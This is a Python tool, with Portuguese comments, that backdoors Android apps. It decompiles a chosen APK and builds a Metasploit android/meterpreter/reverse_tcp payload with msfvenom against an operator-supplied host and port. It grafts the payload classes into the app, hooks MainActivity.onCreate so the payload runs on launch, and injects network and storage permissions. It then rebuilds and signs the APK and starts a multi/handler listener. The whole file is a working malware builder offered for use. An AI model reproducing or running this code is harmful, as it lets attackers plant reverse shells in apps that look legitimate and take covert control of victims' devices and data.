#!/usr/bin/env python3
import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- PALETA DE CORES ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}FULL-CHAIN WEAPONIZER{RESET} | {WHITE}Build + Sign + Listen (Red Edition){RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def check_tools():
    """Verifica se as dependências essenciais estão instaladas."""
    tools = ["apktool", "msfvenom", "apksigner", "keytool", "msfconsole"]
    missing = [t for t in tools if not which(t)]
    if missing:
        log(f"Dependências faltando: {', '.join(missing)}", "warn")
        log("Por favor, instale as ferramentas necessárias antes de continuar.", "info")

def fix_permissions(project_folder):
    """Injeta permissões de rede e persistência no AndroidManifest.xml."""
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    if not os.path.exists(manifest): return
    
    with open(manifest, "r") as f: content = f.read()
    
    perms = [
        'android.permission.INTERNET', 
        'android.permission.ACCESS_NETWORK_STATE', 
        'android.permission.WAKE_LOCK',
        'android.permission.READ_EXTERNAL_STORAGE'
    ]
    needed = [f'    <uses-permission android:name="{p}"/>' for p in perms if p not in content]
    
    if needed:
        # Insere antes do fechamento da tag /manifest
        new_content = content.replace("</manifest>", "\n".join(needed) + "\n</manifest>")
        with open(manifest, "w") as f: f.write(new_content)
        log(f"Permissões de rede injetadas com sucesso.", "success")

def iniciar_listener(ip, porta):
    """Cria o script RC e dispara o Metasploit Handler."""
    log(f"Configurando Metasploit Handler em {ip}:{porta}...", "info")
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {porta}
set EXITONSESSION false
exploit -j
    """
    with open("handler.rc", "w") as f: f.write(rc_content)
    log("Disparando msfconsole (Modo Background)...", "warn")
    os.system(f"msfconsole -q -r handler.rc")

def gerar_e_injetar_payload(project_folder):
    """Gera o payload via msfvenom e faz a 'cirurgia' no código-fonte Smali."""
    lhost = input(f" {YELLOW}»{RESET} Seu IP ou DNS (LHOST): ").strip()
    lport = input(f" {YELLOW}»{RESET} Sua Porta (LPORT): ").strip()
    if not lhost or not lport:
        log("IP ou Porta inválidos!", "error"); return False, None, None

    log(f"Gerando Meterpreter Payload ({lhost}:{lport})...", "info")
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload_tmp.apk"], capture_output=True)
    
    if not os.path.exists("payload_tmp.apk"):
        log("Falha ao gerar o payload com msfvenom!", "error"); return False, None, None

    log("Decompilando payload e migrando classes...", "info")
    subprocess.run(["apktool", "d", "payload_tmp.apk", "-o", "payload_tmp", "-f"], capture_output=True)
    
    src_smali = os.path.join("payload_tmp", "smali", "com", "metasploit")
    dst_smali = os.path.join(project_folder, "smali", "com", "metasploit")
    
    if os.path.exists(dst_smali): rmtree(dst_smali)
    os.makedirs(os.path.dirname(dst_smali), exist_ok=True)
    copytree(src_smali, dst_smali)

    # Localizar a MainActivity no Manifesto
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m_content = f.read()
        match = re.search(r'<activity [^>]*android:name="([^"]+)"', m_content)
        if not match:
            log("MainActivity não encontrada no manifesto!", "error"); return False, None, None
        main_activity = match.group(1)
    
    # Resolver caminho do arquivo .smali
    smali_filename = main_activity.replace('.', '/') + ".smali"
    smali_path = None
    for root, dirs, files in os.walk(project_folder):
        if smali_filename in os.path.join(root, smali_filename):
            smali_path = os.path.join(root, smali_filename); break

    if smali_path:
        log(f"Injetando Hook em: {os.path.basename(smali_path)}", "info")
        with open(smali_path, "r") as f: lines = f.readlines()
        
        new_lines, in_oncreate, injected = [], False, False
        for line in lines:
            new_lines.append(line)
            if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line:
                in_oncreate = True
            if in_oncreate and "invoke-super" in line and not injected:
                new_lines.append(f"\n    # WEAPONIZER AUTO-START HOOK\n")
                new_lines.append(f"    invoke-static {{p0}}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
            if ".end method" in line:
                in_oncreate = False
            
        with open(smali_path, "w") as f: f.writelines(new_lines)
        fix_permissions(project_folder)
        
        # Limpeza de arquivos temporários
        if os.path.exists("payload_tmp"): rmtree("payload_tmp")
        if os.path.exists("payload_tmp.apk"): os.remove("payload_tmp.apk")
        log("Injeção e correção de manifesto concluídas!", "success")
        return True, lhost, lport
    
    log("Erro ao localizar o arquivo smali da MainActivity.", "error")
    return False, None, None

def build_e_assinar(out):
    """Recompila o projeto e aplica a assinatura V2/V3."""
    final_apk = os.path.abspath(f"{out}_weaponized.apk")
    log(f"Recompilando projeto '{out}'...", "info")
    
    # Build
    res = subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True, text=True)
    if res.returncode != 0:
        log("Falha na recompilação do Apktool!", "error"); print(res.stderr); return False

    # Assinatura
    ks = "debug.keystore"
    if not os.path.exists(ks):
        log("Gerando Keystore de depuração...", "info")
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)
    
    log("Certificando APK via apksigner...", "info")
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    print(f"\n{GREEN}[+] SUCESSO!{RESET} APK armado gerado em: {BOLD}{final_apk}{RESET}")
    return True

def main():
    check_tools()
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Abre e prepara o APK)")
        print(f" [{RED}2{RESET}] INJETAR SHELL REVERSA + BUILD + SIGN + LISTEN")
        print(f" [{RED}3{RESET}] Listar Arquivos (ls)")
        print(f" [{RED}4{RESET}] Sair")
        
        try: login = os.getlogin()
        except: login = "user"
        
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@{login}:~# {RESET}").strip()
        
        if cmd.lower() == "ls" or cmd == "3":
            print(f"\n{BOLD}Caminho: {os.getcwd()}{RESET}")
            subprocess.run(["ls", "-F", "--color=auto"])
            input("\nPressione Enter para voltar ao menu...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} Caminho do arquivo .apk: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                log(f"Descompilando {os.path.basename(file)}...", "info")
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Pasta de trabalho criada: {out}", "success")
                time.sleep(2)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Nome da pasta do projeto alvo: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, porta = gerar_e_injetar_payload(out)
                if success:
                    if build_e_assinar(out):
                        check = input(f"\n{YELLOW}[?]{RESET} Deseja iniciar o handler no msfconsole agora? (s/n): ").lower()
                        if check == 's': iniciar_listener(ip, porta)
            else: log(f"A pasta '{out}' não existe.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() in ["exit", "sair", "3"]: break
        elif cmd.lower() == "clear": continue

if __name__ == "__main__":
    main()
